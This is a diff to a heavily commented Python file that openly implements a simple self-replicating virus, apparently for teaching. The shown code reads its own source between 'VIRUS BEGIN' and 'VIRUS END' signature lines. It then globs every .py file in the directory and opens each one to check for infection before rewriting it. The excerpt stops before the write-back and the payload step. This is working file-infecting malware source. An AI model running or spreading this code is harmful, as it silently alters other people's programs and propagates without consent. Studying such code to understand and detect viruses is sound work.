@@ -4,19 +4,23 @@ import sys, glob, re
 
 # 1. get a copy of the virus
 # 2. find potential victims (other programs)
-# 3. check and infect 
+# 3. check and infect
 # 4. optional payload (execute virus program)
 
 
 #### STEP 1: GET A COPY OF THE VIRUS ####
-vCode = []                                              # virus list
+    # open a copy of the virus to read
+    # check if in the virus by looking for signature (#### VIRUS BEGIN ####)
+    # save all lines of virus code to vCode variable until reaching the last line (#### VIRUS END ####)
+
+vCode = []                                              # virus list: stores a copy of the file
 fh = open(sys.argv[0], "r")                             # open copy of self, read only
 lines = fh.readlines()                                  # read all lines of the virus file, save to lines
 fh.close()                                              # close the file
 
 inVirus = False                                         # default: not in the virus
 
-for line in lines:                                      # iterate through lines from file
+for line in lines:                                      # iterate through lines from virus file
     if (re.search('^#### VIRUS BEGIN ####', line)):     # check for the virus SIGNATURE
         inVirus = True                                  # if so, we are in the virus
 
@@ -28,10 +32,15 @@ for line in lines:                                      # iterate through lines 
 
 
 #### STEP 2: FIND POTENTIAL VICTIMS (PROGRAMS) ####
-progs = glob.glob("*.py")                               # search for all programs with a *.py extension (python files)
+progs = glob.glob("*.py")                               # search for all programs with a *.py extension using glob method
 
 
-#### STEP 3: CHECK AND INFECT ####                      # look through potential victims, check if infected or not
+#### STEP 3: CHECK AND INFECT ####
+    # look through potential program victims, check if infected or not
+    # if infected, skip, move on to the next program
+    # if NOT infected, re-write the program as a copy of the original program code (pCode) 
+    # AND a copy of virus code (vCode)
+
 for prog in progs:                                      # iterate through selected programs
     fh = open(prog, "r")                                # open the program file as read only
     pCode = fh.readlines()                              # read lines in file, save to pCode variable
